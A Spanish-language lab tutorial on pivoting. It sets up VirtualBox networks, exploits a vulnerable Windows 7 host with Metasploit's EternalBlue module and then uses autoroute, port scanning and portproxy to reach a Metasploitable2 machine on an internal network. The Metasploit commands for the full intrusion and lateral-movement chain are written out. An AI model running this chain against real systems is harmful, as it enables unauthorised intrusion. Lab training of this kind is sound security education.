# Pivoting en Entornos Windows

Maquinas que vamos a utilizar **Kali Linux , Windows 7 Vulnerable y Metasploitable2** 

[https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view?usp=sharing](https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view?usp=sharing)

[Metasploitable2https://sourceforge.net/projects/metasploitable/files/Metasploitable2](https://sourceforge.net/projects/metasploitable/files/Metasploitable2) 

### **Mapa de la Red que vamos a utilizar**

![image.png](./imagenes/image%204.png)

- Configuramos las redes en VirtualBox **Archivos → Herramientas → Administrador de red.**
    - Tenemos que tener creadas dos redes.
        1. Red **Pedro → 10.0.3.0/24**
            
            ![image.png](./imagenes/image%205.png)
            
        
        1. Red **Red_Pivoting → 10.10.10.0/24**
            
            ![image.png](./imagenes/image%206.png)
            
    
    - Los adaptadores de red de las maquinas quedarían asi.
        1. Maquina Kali quedaría así:
            
            ![image.png](./imagenes/image%207.png)
            
            En la Kali Linux me tendría que aparecer una IP dentro del rango de red que le había asignado. Lo veriamos con `ifconfig`.
            
            ![image.png](./imagenes/image%208.png)
            
        2. Maquina Windows 7
            
            ![image.png](./imagenes/image%209.png)
            
            ![image.png](./imagenes/image%2010.png)
            
            Al hacer un `ipconfig` nos quedaría mas o menos así con dos IP en distintos adaptadores de red.
            
            ![image.png](./imagenes/image%2011.png)
            
        3. Maquina Metasploitable2
            
            ![image.png](./imagenes/image%2012.png)
            
            Usamos el usuario y contraseña para entrar  **usuario/pass: msfadmin** y hacemos un `ifconfig`.
            
            ![image.png](./imagenes/image%2013.png)
            

---

Comenzamos. Vamos a hacer el proceso completo , haremos una intrusión a la maquina con Windows 7 y luego el **Pivoting** a la metasplitable2.

```bash
sudo arp-scan -I eth0 --localnet
```

![image.png](./imagenes/image%2014.png)

![image.png](./imagenes/image%2015.png)

- Ejecutamos el Metasploit
    
    ![image.png](./imagenes/image%2016.png)
    

- Vamos a explotar un EternalBlue
    
    `search eternalblue`
    
    ![image.png](./imagenes/image%2017.png)
    

`use 0`

![image.png](./imagenes/image%2018.png)

`show options`

![image.png](./imagenes/image%2019.png)

- Rellenamos los datos que necesitemos y ejecutamos el exploit.
    
    `set RHOST 10.0.3.6`
    
    `run`
    
    ![image.png](./imagenes/image%2020.png)
    
    ![image.png](./imagenes/image%2021.png)
    
    Ya tenemos una sesión de Meterpreter
    

<aside>
💡

Importante para hacer **Pivoting** hay que hacerlo **todo desde el meterpreter.**

</aside>

- `ipconfig`
    
    ![image.png](./imagenes/image%2022.png)
    
    Vemos que **tenemos dos IPs distintas** que pertenecen a **dos interfaces** distintas.
    
    `10.0.3.6`
    
    `10.10.10.4` → **Aquí debo hacer el Pivoting.**
    
    ![image.png](./imagenes/image%2023.png)
    

---

- **Dejamos** la sesión **en Background** y comprobamos que se a quedado en segundo plano y el ID de sesión que mas tarde necesitaremos.
    
    `CTRL+Z`
    
    `sessions -l`
    
    ![image.png](./imagenes/image%2024.png)
    
- Vamos a utilizar un modulo de metasploit que sirve para **encontrar equipos dentro de la red interna**.
    
    `use windows/gather/arp_scanner`
    
    ![image.png](./imagenes/image%2025.png)
    

- Miramos las opciones y rellenamos las que necesitemos.
    
    `show options`
    
    ![image.png](./imagenes/image%2026.png)
    
    `set RHOSTS 10.10.10.4/24`
    
    <aside>
    💡
    
    Como vemos hemos puesto la **IP nueva** que habíamos encontrado y le hemos añadido **/24**. Esto lo hacemos para que al hacer la búsqueda abarque **todo el ranco de red** de esa IP.
    
    </aside>
    

`set SESSION 1`

`show options`

![image.png](./imagenes/image%2027.png)

`run`

![image.png](./imagenes/image%2028.png)

Ya hemos encontrado la IP de la maquina victima. Ahora **hay que enrutar el trafico** para que envié el trafico de la maquina final a mi maquina Kali.

![image.png](./imagenes/image%2029.png)

- Usamos el modulo autorute para **enrutar el trafico**. Miramos las opciones y completamos las que necesitemos.
    
    `use multi/manage/autoroute`
    
    ![image.png](./imagenes/image%2030.png)
    
    `show options`
    
    `set SESSION 1`
    
    `show options`
    
    ![image.png](./imagenes/image%2031.png)
    

`run`

![image.png](./imagenes/image%2032.png)

Ya tenemos el trafico enrutado

![image.png](./imagenes/image%2033.png)

- Hacemos un **escaneo de puertos abierto de la maquina Victima.** Seria como hacer un nmap pero desde metasploit.
    
    `use scanner/portscan/tcp`
    
    `show options`
    
    ![image.png](./imagenes/image%2034.png)
    
    <aside>
    
    **OJO**, **con `PORTS`** esta puesto **escaneo hasta** el puerto **10000** , en caso de necesitar a puerto superiores tendríamos que cambiarlo.
    
    </aside>
    

`set RHOSTS 10.10.10.5`

![image.png](./imagenes/image%2035.png)

`run`

![image.png](./imagenes/image%2036.png)

**Esperamos a que acabe** y en nuestro caso voy a **enumerar el puerto 80** que esta abierto.

- Como estamos haciendo el **pivoting en Windows usamos el siguiente modulo.**
    
    `use post/windows/manage/portproxy`
    
    `show options`
    
    ![image.png](./imagenes/image%2037.png)
    
- Rellenamos los apartados que necesitamos.
    
    CONNECT_ADDRESS → **IP** de la **maquina victima**
    
    CONNECT_PORT  → **Puerto** que voy **a atacar** en mi caso el 80
    
    LOCAL_ADDRESS → Poner s**iempre 0.0.0.0**
    
    LOCAL_PORT → Donde nos queramos **traer el puerto que estamos atacando**.
    
    SESSION  → **ID** de la **sesión abierta**
    

`set CONNECT_ADDRESS 10.10.10.5`

`set CONNECT_PORT 80`

`set LOCAL_ADDRESS 0.0.0.0`

`set LOCAL_PORT 5000`

`set SESSION 1`

`show options`

![image.png](./imagenes/image%2038.png)

`run`

![image.png](./imagenes/image%2039.png)

Ya tendríamos la conexión sobre el puerto 80 de la maquina Meterpreter.

- Vamos a **acceder al puerto 80** de la maquina metasploitable2.
    - Abrimos el **navegador web** de la maquina Kali Linux ponemos la **IP de la maquina que esta en medio ,** en nuestro caso la de Windows 7 y el **puerto** que hemos **elegido enrutar** en este caso el 5000. `10.0.3.6:5000`
        
        ![image.png](./imagenes/image%2040.png)